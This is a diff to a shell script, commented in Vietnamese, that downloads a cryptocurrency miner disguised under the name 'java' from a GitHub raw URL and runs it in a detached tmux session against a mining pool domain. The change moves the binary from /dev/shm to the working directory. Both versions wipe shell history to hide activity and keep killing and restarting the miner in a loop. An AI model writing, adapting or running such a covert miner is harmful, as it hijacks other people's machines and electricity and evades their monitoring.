@@ -3,7 +3,6 @@
 SESSION="java"
 DOMAIN="$1"
 NAME_WORK="$2"
-EXEC_PATH="/dev/shm/java"
 
 # ❌ Xoá shell history
 unset HISTFILE
@@ -22,33 +21,29 @@ export HISTFILE=/dev/null
   done
 ) &
 
-# 📥 Nếu chưa có tool thì tải 1 lần duy nhất
-if [ ! -f "$EXEC_PATH" ]; then
+# 📥 Tải và giải nén nếu chưa có
+if [ ! -f "$(pwd)/java/java" ]; then
     echo "[+] Downloading miner..."
-    cd /dev/shm
+    rm -rf java java.tar.gz
     wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
     tar -xzf java.tar.gz
     chmod +x java/java
-    mv java/java "$EXEC_PATH"
-    rm -rf java java.tar.gz
+    rm -f java.tar.gz
 fi
 
-# 🔁 Vòng lặp: kill và chạy lại mỗi 5 phút
+# 🔁 Vòng lặp chạy miner
 echo "[+] Vòng lặp ..."
 while true; do
-    # 🔪 Kill tiến trình cũ nếu có
-    pkill -f "$EXEC_PATH" 2>/dev/null
-    echo "[+] Kill process - sleep 20s..."
-    sleep 20
+    pkill -f "$(pwd)/java/java" 2>/dev/null
+    echo "[+] Kill process - sleep 5s..."
+    sleep 5
 
-    # ▶️ Chạy lại trong tmux (PID mới)
     tmux kill-session -t $SESSION 2>/dev/null
     echo "[+] run process - sleep 5 phút..."
     tmux new-session -s $SESSION -d
     tmux send-keys -t $SESSION "
-        $EXEC_PATH -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
+        $(pwd)/java/java -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
     " C-m
 
-    # ⏲️ Chờ 5 phút
     sleep 300
 done
